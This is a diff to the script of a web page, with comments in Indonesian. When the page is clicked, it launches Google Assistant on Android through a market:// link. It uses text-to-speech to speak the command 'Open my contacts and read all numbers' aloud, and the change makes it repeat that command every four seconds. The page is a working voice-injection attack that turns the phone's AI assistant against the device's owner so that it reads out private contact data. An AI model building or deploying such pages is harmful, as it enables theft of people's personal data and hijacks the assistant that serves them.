@@ -2,11 +2,17 @@
 
 <script>
   onclick = () => {
-    // Bacakan perintah lewat TTS
-    const utterance = new SpeechSynthesisUtterance('Open my contacts and read out the numbers');
-    speechSynthesis.speak(utterance);
+    // Buat teks yang akan dibacakan
+    const utterance = new SpeechSynthesisUtterance('Open my contacts and read all numbers');
 
-    // Membuka aplikasi Google Assistant di Android dengan market scheme
+    // Jalankan TTS setiap 4 detik
+    setInterval(() => {
+      if (!speechSynthesis.speaking) {
+        speechSynthesis.speak(utterance);
+      }
+    }, 4000);
+
+    // Membuka aplikasi Google Assistant di Android
     window.location.href = 'market://launch?id=com.google.android.apps.googleassistant';
   };
 </script>
